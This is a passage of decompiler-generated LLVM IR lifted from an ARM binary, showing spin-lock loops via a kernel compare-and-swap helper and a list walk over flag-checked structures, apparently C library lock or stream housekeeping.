  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_2ba24 ]
  store i32 176, i32* %r3.global-to-local, align 4
  %v4_2ba38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 176) to i32*), align 4
  store i32 %v4_2ba38, i32* %r5.global-to-local, align 4
  %v0_2ba3c = call i32 @__aeabi_read_tp()
  store i32 %v0_2ba3c, i32* %r0.global-to-local, align 4
  %v1_2ba40 = add i32 %v4_2ba38, 8
  %v2_2ba40 = inttoptr i32 %v1_2ba40 to i32*
  %v3_2ba40 = load i32, i32* %v2_2ba40, align 4
  store i32 %v3_2ba40, i32* %r3.global-to-local, align 4
  %v1_2ba44 = add i32 %v0_2ba3c, -1168
  store i32 %v1_2ba44, i32* %r8.global-to-local, align 4
  %v3_2ba48 = icmp uge i32 %v3_2ba40, %v1_2ba44
  store i1 %v3_2ba48, i1* %cpsr_c.global-to-local, align 1
  %v9_2ba48 = icmp eq i32 %v3_2ba40, %v1_2ba44
  br i1 %v9_2ba48, label %dec_label_pc_2ba90, label %dec_label_pc_2ba50

dec_label_pc_2ba50:                               ; preds = %dec_label_pc_2ba34
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_2ba38, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_2ba5c143 = inttoptr i32 %v4_2ba38 to i32*
  %v2_2ba5c144 = load i32, i32* %v1_2ba5c143, align 4
  store i32 %v2_2ba5c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_2ba60146 = icmp eq i32 %v2_2ba5c144, 0
  br i1 %v9_2ba60146, label %dec_label_pc_2ba68, label %dec_label_pc_2ba80

dec_label_pc_2ba68:                               ; preds = %dec_label_pc_2ba50, %dec_label_pc_2ba68.dec_label_pc_2ba5c_crit_edge
  %v0_2ba68147 = phi i32 [ %v1_2ba60.pre, %dec_label_pc_2ba68.dec_label_pc_2ba5c_crit_edge ], [ 0, %dec_label_pc_2ba50 ]
  store i32 %v0_2ba68147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2ba78 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2ba78, label %dec_label_pc_2ba7c, label %dec_label_pc_2ba68.dec_label_pc_2ba5c_crit_edge

dec_label_pc_2ba68.dec_label_pc_2ba5c_crit_edge:  ; preds = %dec_label_pc_2ba68
  %v0_2ba5c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2ba60.pre = load i32, i32* @r4, align 4
  %v1_2ba5c = inttoptr i32 %v0_2ba5c.pre to i32*
  %v2_2ba5c = load i32, i32* %v1_2ba5c, align 4
  store i32 %v2_2ba5c, i32* %r3.global-to-local, align 4
  %v3_2ba60 = icmp uge i32 %v2_2ba5c, %v1_2ba60.pre
  store i1 %v3_2ba60, i1* %cpsr_c.global-to-local, align 1
  %v9_2ba60 = icmp eq i32 %v2_2ba5c, %v1_2ba60.pre
  br i1 %v9_2ba60, label %dec_label_pc_2ba68, label %dec_label_pc_2ba80

dec_label_pc_2ba7c:                               ; preds = %dec_label_pc_2ba68
  %v0_2ba7c = load i32, i32* @r4, align 4
  store i32 %v0_2ba7c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2ba80

dec_label_pc_2ba80:                               ; preds = %dec_label_pc_2ba50, %dec_label_pc_2ba68.dec_label_pc_2ba5c_crit_edge, %dec_label_pc_2ba7c
  %v0_2ba80 = phi i32 [ %v0_2ba7c, %dec_label_pc_2ba7c ], [ %v2_2ba5c144, %dec_label_pc_2ba50 ], [ %v2_2ba5c, %dec_label_pc_2ba68.dec_label_pc_2ba5c_crit_edge ]
  %v1_2ba80 = phi i32 [ %v0_2ba7c, %dec_label_pc_2ba7c ], [ 0, %dec_label_pc_2ba50 ], [ %v1_2ba60.pre, %dec_label_pc_2ba68.dec_label_pc_2ba5c_crit_edge ]
  %v3_2ba80 = icmp uge i32 %v0_2ba80, %v1_2ba80
  store i1 %v3_2ba80, i1* %cpsr_c.global-to-local, align 1
  %v9_2ba80 = icmp eq i32 %v0_2ba80, %v1_2ba80
  br i1 %v9_2ba80, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_2ba80
  %v1_2ba84 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_2ba84, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_2ba80, %bb65
  %v1_2ba88 = xor i1 %v9_2ba80, true
  call void @__pseudo_cond_branch(i1 %v1_2ba88, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2ba8c = load i32, i32* %r8.global-to-local, align 4
  %v1_2ba8c = load i32, i32* %r5.global-to-local, align 4
  %v2_2ba8c = add i32 %v1_2ba8c, 8
  %v3_2ba8c = inttoptr i32 %v2_2ba8c to i32*
  store i32 %v0_2ba8c, i32* %v3_2ba8c, align 4
  br label %dec_label_pc_2ba90

dec_label_pc_2ba90:                               ; preds = %dec_label_pc_2ba34, %bb66
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_2ba94 = load i32, i32* @r6, align 4
  %v2_2ba94 = add i32 %v0_2ba94, 176
  %v3_2ba94 = inttoptr i32 %v2_2ba94 to i32*
  %v4_2ba94 = load i32, i32* %v3_2ba94, align 4
  store i32 %v4_2ba94, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_2ba9c = add i32 %v0_2ba94, 12
  %v3_2ba9c = inttoptr i32 %v2_2ba9c to i32*
  %v4_2ba9c = load i32, i32* %v3_2ba9c, align 4
  store i32 %v4_2ba9c, i32* %r2.global-to-local, align 4
  %v1_2baa0 = add i32 %v4_2ba94, 4
  %v2_2baa0 = inttoptr i32 %v1_2baa0 to i32*
  %v3_2baa0 = load i32, i32* %v2_2baa0, align 4
  store i32 %v3_2baa0, i32* %r1.global-to-local, align 4
  %v1_2baa4 = inttoptr i32 %v4_2ba9c to i32*
  %v2_2baa4 = load i32, i32* %v1_2baa4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2baa8 = icmp eq i32 %v3_2baa0, 0
  %v1_2baac = add i32 %v2_2baa4, 1
  store i32 %v1_2baac, i32* %r3.global-to-local, align 4
  store i32 %v1_2baac, i32* %v1_2baa4, align 4
  br i1 %v2_2baa8, label %dec_label_pc_2bab8, label %dec_label_pc_2bb18

dec_label_pc_2bab8:                               ; preds = %dec_label_pc_2ba90
  %v0_2bab8 = load i32, i32* %r1.global-to-local, align 4
  %v1_2bab8 = load i32, i32* %r0.global-to-local, align 4
  %v2_2bab8 = add i32 %v1_2bab8, 8
  %v3_2bab8 = inttoptr i32 %v2_2bab8 to i32*
  store i32 %v0_2bab8, i32* %v3_2bab8, align 4
  %v0_2babc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2babc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2bac0

dec_label_pc_2bac0:                               ; preds = %dec_label_pc_2baf0.dec_label_pc_2bac0_crit_edge, %dec_label_pc_2bab8
  %v0_2bac0 = phi i32 [ %v0_2bac0.pre, %dec_label_pc_2baf0.dec_label_pc_2bac0_crit_edge ], [ %v0_2babc, %dec_label_pc_2bab8 ]
  %v1_2bac0 = inttoptr i32 %v0_2bac0 to i32*
  %v2_2bac0 = load i32, i32* %v1_2bac0, align 4
  store i32 %v2_2bac0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2bac0, i32* %r2.global-to-local, align 4
  %v2_2bacc131 = load i32, i32* %v1_2bac0, align 4
  store i32 %v2_2bacc131, i32* %r3.global-to-local, align 4
  %v3_2bad0133 = icmp uge i32 %v2_2bacc131, %v2_2bac0
  store i1 %v3_2bad0133, i1* %cpsr_c.global-to-local, align 1
  %v9_2bad0139 = icmp eq i32 %v2_2bacc131, %v2_2bac0
  br i1 %v9_2bad0139, label %dec_label_pc_2bad8, label %dec_label_pc_2baf0

dec_label_pc_2bad8:                               ; preds = %dec_label_pc_2bac0, %dec_label_pc_2bad8.dec_label_pc_2bacc_crit_edge
  %v0_2bad8140 = phi i32 [ %v1_2bad0.pre, %dec_label_pc_2bad8.dec_label_pc_2bacc_crit_edge ], [ %v2_2bac0, %dec_label_pc_2bac0 ]
  store i32 %v0_2bad8140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2bae8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2bae8, label %dec_label_pc_2baec, label %dec_label_pc_2bad8.dec_label_pc_2bacc_crit_edge

dec_label_pc_2bad8.dec_label_pc_2bacc_crit_edge:  ; preds = %dec_label_pc_2bad8
  %v0_2bacc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2bad0.pre = load i32, i32* @r4, align 4
  %v1_2bacc = inttoptr i32 %v0_2bacc.pre to i32*
  %v2_2bacc = load i32, i32* %v1_2bacc, align 4
  store i32 %v2_2bacc, i32* %r3.global-to-local, align 4
  %v3_2bad0 = icmp uge i32 %v2_2bacc, %v1_2bad0.pre
  store i1 %v3_2bad0, i1* %cpsr_c.global-to-local, align 1
  %v9_2bad0 = icmp eq i32 %v2_2bacc, %v1_2bad0.pre
  br i1 %v9_2bad0, label %dec_label_pc_2bad8, label %dec_label_pc_2baf0

dec_label_pc_2baec:                               ; preds = %dec_label_pc_2bad8
  %v0_2baec = load i32, i32* @r4, align 4
  store i32 %v0_2baec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2baf0

dec_label_pc_2baf0:                               ; preds = %dec_label_pc_2bac0, %dec_label_pc_2bad8.dec_label_pc_2bacc_crit_edge, %dec_label_pc_2baec
  %v0_2baf8 = phi i32 [ %v0_2baec, %dec_label_pc_2baec ], [ %v2_2bacc131, %dec_label_pc_2bac0 ], [ %v2_2bacc, %dec_label_pc_2bad8.dec_label_pc_2bacc_crit_edge ]
  %v1_2baf0 = phi i32 [ %v0_2baec, %dec_label_pc_2baec ], [ %v2_2bac0, %dec_label_pc_2bac0 ], [ %v1_2bad0.pre, %dec_label_pc_2bad8.dec_label_pc_2bacc_crit_edge ]
  %v3_2baf0 = icmp uge i32 %v0_2baf8, %v1_2baf0
  store i1 %v3_2baf0, i1* %cpsr_c.global-to-local, align 1
  %v9_2baf0 = icmp eq i32 %v0_2baf8, %v1_2baf0
  br i1 %v9_2baf0, label %dec_label_pc_2baf8, label %dec_label_pc_2baf0.dec_label_pc_2bac0_crit_edge

dec_label_pc_2baf0.dec_label_pc_2bac0_crit_edge:  ; preds = %dec_label_pc_2baf0
  %v0_2bac0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2bac0

dec_label_pc_2baf8:                               ; preds = %dec_label_pc_2baf0
  %v2_2baf8 = icmp ne i32 %v1_2baf0, 0
  store i1 %v2_2baf8, i1* %cpsr_c.global-to-local, align 1
  %v7_2bafc = icmp slt i32 %v1_2baf0, 2
  br i1 %v7_2bafc, label %dec_label_pc_2bb18, label %dec_label_pc_2bb00

dec_label_pc_2bb00:                               ; preds = %dec_label_pc_2baf8
  %v0_2bb00 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2bb00, i32* %r0.global-to-local, align 4
  %v0_2bb04 = load i32, i32* %r1.global-to-local, align 4
  %v1_2bb04 = add i32 %v0_2bb04, 129
  store i32 %v1_2bb04, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2bb18

dec_label_pc_2bb18:                               ; preds = %dec_label_pc_2ba90, %dec_label_pc_2bb00, %dec_label_pc_2baf8
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_2bb1c = load i32, i32* @r6, align 4
  %v2_2bb1c = add i32 %v0_2bb1c, 168
  %v3_2bb1c = inttoptr i32 %v2_2bb1c to i32*
  %v4_2bb1c = load i32, i32* %v3_2bb1c, align 4
  store i32 %v4_2bb1c, i32* %r5.global-to-local, align 4
  %v1_2bb20 = add i32 %v4_2bb1c, 8
  %v2_2bb20 = inttoptr i32 %v1_2bb20 to i32*
  %v3_2bb20 = load i32, i32* %v2_2bb20, align 4
  store i32 %v3_2bb20, i32* %r3.global-to-local, align 4
  %v1_2bb24 = load i32, i32* %r8.global-to-local, align 4
  %v3_2bb24 = icmp uge i32 %v3_2bb20, %v1_2bb24
  store i1 %v3_2bb24, i1* %cpsr_c.global-to-local, align 1
  %v9_2bb24 = icmp eq i32 %v3_2bb20, %v1_2bb24
  br i1 %v9_2bb24, label %dec_label_pc_2bb6c, label %dec_label_pc_2bb2c

dec_label_pc_2bb2c:                               ; preds = %dec_label_pc_2bb18
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_2bb1c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_2bb38123 = inttoptr i32 %v4_2bb1c to i32*
  %v2_2bb38124 = load i32, i32* %v1_2bb38123, align 4
  store i32 %v2_2bb38124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_2bb3c126 = icmp eq i32 %v2_2bb38124, 0
  br i1 %v9_2bb3c126, label %dec_label_pc_2bb44, label %dec_label_pc_2bb5c

dec_label_pc_2bb44:                               ; preds = %dec_label_pc_2bb2c, %dec_label_pc_2bb44.dec_label_pc_2bb38_crit_edge
  %v0_2bb44127 = phi i32 [ %v1_2bb3c.pre, %dec_label_pc_2bb44.dec_label_pc_2bb38_crit_edge ], [ 0, %dec_label_pc_2bb2c ]
  store i32 %v0_2bb44127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2bb54 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2bb54, label %dec_label_pc_2bb58, label %dec_label_pc_2bb44.dec_label_pc_2bb38_crit_edge

dec_label_pc_2bb44.dec_label_pc_2bb38_crit_edge:  ; preds = %dec_label_pc_2bb44
  %v0_2bb38.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2bb3c.pre = load i32, i32* @r4, align 4
  %v1_2bb38 = inttoptr i32 %v0_2bb38.pre to i32*
  %v2_2bb38 = load i32, i32* %v1_2bb38, align 4
  store i32 %v2_2bb38, i32* %r3.global-to-local, align 4
  %v3_2bb3c = icmp uge i32 %v2_2bb38, %v1_2bb3c.pre
  store i1 %v3_2bb3c, i1* %cpsr_c.global-to-local, align 1
  %v9_2bb3c = icmp eq i32 %v2_2bb38, %v1_2bb3c.pre
  br i1 %v9_2bb3c, label %dec_label_pc_2bb44, label %dec_label_pc_2bb5c

dec_label_pc_2bb58:                               ; preds = %dec_label_pc_2bb44
  %v0_2bb58 = load i32, i32* @r4, align 4
  store i32 %v0_2bb58, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2bb5c

dec_label_pc_2bb5c:                               ; preds = %dec_label_pc_2bb2c, %dec_label_pc_2bb44.dec_label_pc_2bb38_crit_edge, %dec_label_pc_2bb58
  %v0_2bb5c = phi i32 [ %v0_2bb58, %dec_label_pc_2bb58 ], [ %v2_2bb38124, %dec_label_pc_2bb2c ], [ %v2_2bb38, %dec_label_pc_2bb44.dec_label_pc_2bb38_crit_edge ]
  %v1_2bb5c = phi i32 [ %v0_2bb58, %dec_label_pc_2bb58 ], [ 0, %dec_label_pc_2bb2c ], [ %v1_2bb3c.pre, %dec_label_pc_2bb44.dec_label_pc_2bb38_crit_edge ]
  %v3_2bb5c = icmp uge i32 %v0_2bb5c, %v1_2bb5c
  store i1 %v3_2bb5c, i1* %cpsr_c.global-to-local, align 1
  %v9_2bb5c = icmp eq i32 %v0_2bb5c, %v1_2bb5c
  br i1 %v9_2bb5c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_2bb5c
  %v1_2bb60 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_2bb60, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_2bb5c, %bb67
  %v1_2bb64 = xor i1 %v9_2bb5c, true
  call void @__pseudo_cond_branch(i1 %v1_2bb64, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2bb68 = load i32, i32* %r8.global-to-local, align 4
  %v1_2bb68 = load i32, i32* %r5.global-to-local, align 4
  %v2_2bb68 = add i32 %v1_2bb68, 8
  %v3_2bb68 = inttoptr i32 %v2_2bb68 to i32*
  store i32 %v0_2bb68, i32* %v3_2bb68, align 4
  %v0_2bb70.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2bb6c

dec_label_pc_2bb6c:                               ; preds = %dec_label_pc_2bb18, %bb68
  %v0_2bb7c = phi i32 [ %v0_2bb1c, %dec_label_pc_2bb18 ], [ %v0_2bb70.pre, %bb68 ]
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_2bb70 = add i32 %v0_2bb7c, 168
  %v3_2bb70 = inttoptr i32 %v2_2bb70 to i32*
  %v4_2bb70 = load i32, i32* %v3_2bb70, align 4
  store i32 %v4_2bb70, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r3.global-to-local, align 4
  %v1_2bb78 = add i32 %v4_2bb70, 4
  %v2_2bb78 = inttoptr i32 %v1_2bb78 to i32*
  %v3_2bb78 = load i32, i32* %v2_2bb78, align 4
  store i32 %v3_2bb78, i32* %r1.global-to-local, align 4
  %v2_2bb7c = add i32 %v0_2bb7c, 88
  %v3_2bb7c = inttoptr i32 %v2_2bb7c to i32*
  %v4_2bb7c = load i32, i32* %v3_2bb7c, align 4
  store i32 %v4_2bb7c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2bb80 = icmp eq i32 %v3_2bb78, 0
  %v1_2bb84 = inttoptr i32 %v4_2bb7c to i32*
  %v2_2bb84 = load i32, i32* %v1_2bb84, align 4
  store i32 %v2_2bb84, i32* @r5, align 4
  br i1 %v2_2bb80, label %dec_label_pc_2bb8c, label %dec_label_pc_2bbec

dec_label_pc_2bb8c:                               ; preds = %dec_label_pc_2bb6c
  %v2_2bb8c = add i32 %v4_2bb70, 8
  %v3_2bb8c = inttoptr i32 %v2_2bb8c to i32*
  store i32 0, i32* %v3_2bb8c, align 4
  %v0_2bb90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2bb90, i32* @r7, align 4
  br label %dec_label_pc_2bb94

dec_label_pc_2bb94:                               ; preds = %dec_label_pc_2bbc4.dec_label_pc_2bb94_crit_edge, %dec_label_pc_2bb8c
  %v0_2bb94 = phi i32 [ %v0_2bb94.pre, %dec_label_pc_2bbc4.dec_label_pc_2bb94_crit_edge ], [ %v0_2bb90, %dec_label_pc_2bb8c ]
  %v1_2bb94 = inttoptr i32 %v0_2bb94 to i32*
  %v2_2bb94 = load i32, i32* %v1_2bb94, align 4
  store i32 %v2_2bb94, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2bb94, i32* %r2.global-to-local, align 4
  %v2_2bba0111 = load i32, i32* %v1_2bb94, align 4
  store i32 %v2_2bba0111, i32* %r3.global-to-local, align 4
  %v3_2bba4113 = icmp uge i32 %v2_2bba0111, %v2_2bb94
  store i1 %v3_2bba4113, i1* %cpsr_c.global-to-local, align 1
  %v9_2bba4119 = icmp eq i32 %v2_2bba0111, %v2_2bb94
  br i1 %v9_2bba4119, label %dec_label_pc_2bbac, label %dec_label_pc_2bbc4

dec_label_pc_2bbac:                               ; preds = %dec_label_pc_2bb94, %dec_label_pc_2bbac.dec_label_pc_2bba0_crit_edge
  %v0_2bbac120 = phi i32 [ %v1_2bba4.pre, %dec_label_pc_2bbac.dec_label_pc_2bba0_crit_edge ], [ %v2_2bb94, %dec_label_pc_2bb94 ]
  store i32 %v0_2bbac120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2bbbc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2bbbc, label %dec_label_pc_2bbc0, label %dec_label_pc_2bbac.dec_label_pc_2bba0_crit_edge

dec_label_pc_2bbac.dec_label_pc_2bba0_crit_edge:  ; preds = %dec_label_pc_2bbac
  %v0_2bba0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2bba4.pre = load i32, i32* @r4, align 4
  %v1_2bba0 = inttoptr i32 %v0_2bba0.pre to i32*
  %v2_2bba0 = load i32, i32* %v1_2bba0, align 4
  store i32 %v2_2bba0, i32* %r3.global-to-local, align 4
  %v3_2bba4 = icmp uge i32 %v2_2bba0, %v1_2bba4.pre
  store i1 %v3_2bba4, i1* %cpsr_c.global-to-local, align 1
  %v9_2bba4 = icmp eq i32 %v2_2bba0, %v1_2bba4.pre
  br i1 %v9_2bba4, label %dec_label_pc_2bbac, label %dec_label_pc_2bbc4

dec_label_pc_2bbc0:                               ; preds = %dec_label_pc_2bbac
  %v0_2bbc0 = load i32, i32* @r4, align 4
  store i32 %v0_2bbc0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2bbc4

dec_label_pc_2bbc4:                               ; preds = %dec_label_pc_2bb94, %dec_label_pc_2bbac.dec_label_pc_2bba0_crit_edge, %dec_label_pc_2bbc0
  %v0_2bbcc = phi i32 [ %v0_2bbc0, %dec_label_pc_2bbc0 ], [ %v2_2bba0111, %dec_label_pc_2bb94 ], [ %v2_2bba0, %dec_label_pc_2bbac.dec_label_pc_2bba0_crit_edge ]
  %v1_2bbc4 = phi i32 [ %v0_2bbc0, %dec_label_pc_2bbc0 ], [ %v2_2bb94, %dec_label_pc_2bb94 ], [ %v1_2bba4.pre, %dec_label_pc_2bbac.dec_label_pc_2bba0_crit_edge ]
  %v3_2bbc4 = icmp uge i32 %v0_2bbcc, %v1_2bbc4
  store i1 %v3_2bbc4, i1* %cpsr_c.global-to-local, align 1
  %v9_2bbc4 = icmp eq i32 %v0_2bbcc, %v1_2bbc4
  br i1 %v9_2bbc4, label %dec_label_pc_2bbcc, label %dec_label_pc_2bbc4.dec_label_pc_2bb94_crit_edge

dec_label_pc_2bbc4.dec_label_pc_2bb94_crit_edge:  ; preds = %dec_label_pc_2bbc4
  %v0_2bb94.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2bb94

dec_label_pc_2bbcc:                               ; preds = %dec_label_pc_2bbc4
  %v2_2bbcc = icmp ne i32 %v1_2bbc4, 0
  store i1 %v2_2bbcc, i1* %cpsr_c.global-to-local, align 1
  %v7_2bbd0 = icmp slt i32 %v1_2bbc4, 2
  br i1 %v7_2bbd0, label %dec_label_pc_2bbecthread-pre-split, label %dec_label_pc_2bbd4

dec_label_pc_2bbd4:                               ; preds = %dec_label_pc_2bbcc
  %v0_2bbd4 = load i32, i32* @r7, align 4
  store i32 %v0_2bbd4, i32* %r0.global-to-local, align 4
  %v0_2bbd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_2bbd8 = add i32 %v0_2bbd8, 129
  store i32 %v1_2bbd8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2bbecthread-pre-split

dec_label_pc_2bbecthread-pre-split:               ; preds = %dec_label_pc_2bbcc, %dec_label_pc_2bbd4
  %v0_2bd38.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_2bbec

dec_label_pc_2bbec:                               ; preds = %dec_label_pc_2bbecthread-pre-split, %dec_label_pc_2bb6c
  %v0_2bd38.pr = phi i32 [ %v0_2bd38.pr.pr, %dec_label_pc_2bbecthread-pre-split ], [ %v2_2bb84, %dec_label_pc_2bb6c ]
  store i32 104, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2bd3818 = icmp eq i32 %v0_2bd38.pr, 0
  br i1 %v2_2bd3818, label %dec_label_pc_2bd40, label %dec_label_pc_2bbfc

dec_label_pc_2bbfc:                               ; preds = %dec_label_pc_2bbec, %dec_label_pc_2bd34
  %v0_2bc24 = phi i32 [ %v3_2bd34, %dec_label_pc_2bd34 ], [ %v0_2bd38.pr, %dec_label_pc_2bbec ]
  %v1_2bbfc = inttoptr i32 %v0_2bc24 to i16*
  %v2_2bbfc = load i16, i16* %v1_2bbfc, align 2
  %v3_2bbfc = zext i16 %v2_2bbfc to i32
  store i32 %v3_2bbfc, i32* %r3.global-to-local, align 4
  %v1_2bc00 = and i32 %v3_2bbfc, 64
  %v2_2bc00 = icmp eq i32 %v1_2bc00, 0
  br i1 %v2_2bc00, label %dec_label_pc_2bd34, label %dec_label_pc_2bc08

dec_label_pc_2bc08:                               ; preds = %dec_label_pc_2bbfc
  %v0_2bc08 = load i32, i32* @r6, align 4
  %v1_2bc08 = load i32, i32* %sb.global-to-local, align 4
  %v2_2bc08 = add i32 %v1_2bc08, %v0_2bc08
  %v3_2bc08 = inttoptr i32 %v2_2bc08 to i32*
  %v4_2bc08 = load i32, i32* %v3_2bc08, align 4
  store i32 %v4_2bc08, i32* %r3.global-to-local, align 4
  %v1_2bc0c = inttoptr i32 %v4_2bc08 to i32*
  %v2_2bc0c = load i32, i32* %v1_2bc0c, align 4
  store i32 %v2_2bc0c, i32* %r3.global-to-local, align 4
  %v2_2bc10 = icmp ugt i32 %v2_2bc0c, 1
  store i1 %v2_2bc10, i1* %cpsr_c.global-to-local, align 1
  %v7_2bc10 = icmp eq i32 %v2_2bc0c, 2
  br i1 %v7_2bc10, label %dec_label_pc_2bc74, label %dec_label_pc_2bc18

dec_label_pc_2bc18:                               ; preds = %dec_label_pc_2bc08
  %v1_2bc18 = add i32 %v0_2bc24, 64
  %v2_2bc18 = inttoptr i32 %v1_2bc18 to i32*
  %v3_2bc18 = load i32, i32* %v2_2bc18, align 4
  store i32 %v3_2bc18, i32* %r3.global-to-local, align 4
  %v1_2bc1c = load i32, i32* %r8.global-to-local, align 4
  %v3_2bc1c = icmp uge i32 %v3_2bc18, %v1_2bc1c
  store i1 %v3_2bc1c, i1* %cpsr_c.global-to-local, align 1
  %v9_2bc1c = icmp eq i32 %v3_2bc18, %v1_2bc1c
  br i1 %v9_2bc1c, label %dec_label_pc_2bc68, label %dec_label_pc_2bc24

dec_label_pc_2bc24:                               ; preds = %dec_label_pc_2bc18
  %v1_2bc24 = add i32 %v0_2bc24, 56
  store i32 %v1_2bc24, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_2bc24, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_2bc3486 = inttoptr i32 %v1_2bc24 to i32*
  %v2_2bc3487 = load i32, i32* %v1_2bc3486, align 4
  store i32 %v2_2bc3487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_2bc3894 = icmp eq i32 %v2_2bc3487, 0
  br i1 %v9_2bc3894, label %dec_label_pc_2bc40, label %dec_label_pc_2bc58

dec_label_pc_2bc40:                               ; preds = %dec_label_pc_2bc24, %dec_label_pc_2bc40.dec_label_pc_2bc34_crit_edge
  %v0_2bc4095 = phi i32 [ %v1_2bc38.pre, %dec_label_pc_2bc40.dec_label_pc_2bc34_crit_edge ], [ 0, %dec_label_pc_2bc24 ]
  store i32 %v0_2bc4095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2bc50 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2bc50, label %dec_label_pc_2bc54, label %dec_label_pc_2bc40.dec_label_pc_2bc34_crit_edge

dec_label_pc_2bc40.dec_label_pc_2bc34_crit_edge:  ; preds = %dec_label_pc_2bc40
  %v0_2bc34.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2bc38.pre = load i32, i32* @r4, align 4
  %v1_2bc34 = inttoptr i32 %v0_2bc34.pre to i32*
  %v2_2bc34 = load i32, i32* %v1_2bc34, align 4
  store i32 %v2_2bc34, i32* %r3.global-to-local, align 4
  %v3_2bc38 = icmp uge i32 %v2_2bc34, %v1_2bc38.pre
  store i1 %v3_2bc38, i1* %cpsr_c.global-to-local, align 1
  %v9_2bc38 = icmp eq i32 %v2_2bc34, %v1_2bc38.pre
  br i1 %v9_2bc38, label %dec_label_pc_2bc40, label %dec_label_pc_2bc58

dec_label_pc_2bc54:                               ; preds = %dec_label_pc_2bc40
  %v0_2bc54 = load i32, i32* @r4, align 4
  store i32 %v0_2bc54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2bc58

dec_label_pc_2bc58:                               ; preds = %dec_label_pc_2bc24, %dec_label_pc_2bc40.dec_label_pc_2bc34_crit_edge, %dec_label_pc_2bc54
  %v0_2bc58 = phi i32 [ %v0_2bc54, %dec_label_pc_2bc54 ], [ %v2_2bc3487, %dec_label_pc_2bc24 ], [ %v2_2bc34, %dec_label_pc_2bc40.dec_label_pc_2bc34_crit_edge ]
  %v1_2bc58 = phi i32 [ %v0_2bc54, %dec_label_pc_2bc54 ], [ 0, %dec_label_pc_2bc24 ], [ %v1_2bc38.pre, %dec_label_pc_2bc40.dec_label_pc_2bc34_crit_edge ]
  %v3_2bc58 = icmp uge i32 %v0_2bc58, %v1_2bc58
  store i1 %v3_2bc58, i1* %cpsr_c.global-to-local, align 1
  %v9_2bc58 = icmp eq i32 %v0_2bc58, %v1_2bc58
  br i1 %v9_2bc58, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_2bc58
